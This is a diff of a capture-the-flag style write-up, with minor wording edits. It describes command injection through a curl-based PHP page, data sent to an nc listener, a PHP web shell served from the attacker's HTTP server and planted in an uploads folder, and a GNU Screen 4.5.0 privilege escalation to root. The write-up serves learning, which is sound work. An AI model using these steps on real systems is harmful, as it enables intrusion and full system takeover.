@@ -94,7 +94,7 @@ The page `/exposed.php` has a text input, and when passing a URL it displays on 
 ## Exploitation
 Checking `curl` man page for ways to get more information on the system or executing arbitrary code, I thought that using curl's request body (-d) could be an acceptable way of transmitting info to a listener. By leveraging backticks, commands can be executed and their results would be sent back to our listener.
 
-Set up listener in attacker machine: 
+Set up listener on the attacker machine: 
 ```
 nc -lvp 4444
 ```
@@ -122,7 +122,7 @@ drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
 
 It seems `uploads` may be a good place to place a web shell as `www-data` has write permissions on it. I'm going to use a PHP web shell called `Predator.php` present in this repo https://github.com/JohnTroony/php-webshells.git. Note I use that one because just to check it out, but other much simpler ones should be enough.
 
-The first step to copy the shell into the target server, is to make the shell "curleable" by exposing it through an http server in the attacker:
+The first step to copy the shell into the target server, is to make the shell "curleable" by exposing it through an http server on the attacker:
 ```
 $ cd php-webshells
 $ python -m SimpleHTTPServer
@@ -163,13 +163,13 @@ GNU Screen 4.5.0 - Local Privilege Escalation (PoC)        | linux/local/41152.t
 Shellcodes: No Results
 ```
 
-I'd encourage you to first check the PoC to see what's going on, basically it is possible to create a file owned by root that can be edited by our group (www-data in this case) which can be used for privilege escalation.
+I'd encourage you to first check the PoC to see what's going on, basically it is possible to create a file owned by root that can be edited by us (www-data in this case) which can be used to do privilege escalation.
 
 When trying to execute the script (first exploit listed) it's noticeable that it needs some manual action to be functional:
-- Change the way in which the script creates the .c files. It does is using `cat` and it does not work properly and adds more lines to the file that is not C code and naturally fails afterwards.
-- ```gcc``` fails to compile as it does not find `cc1`. By doing `locate cc1` we see this is its location: `/usr/lib/gcc/x86_64-linux-gnu/5`. Adding that to the path and trying again did the trick.
+- Change the way in which the script creates the .c files. It does is using `cat` and it does not work properly.
+- ```gcc``` fails to compile as it does not find `cc1`. By doing `locate cc1` we see this is its location: `/usr/lib/gcc/x86_64-linux-gnu/5`. Adding that path to the PATH env var retrying did the trick.
 
-After completing these manual actions, a root shell is popped after executing the script:
+After completing these manual actions, a root shell is popped when executing the script:
 ```
 # whoami
 whoami
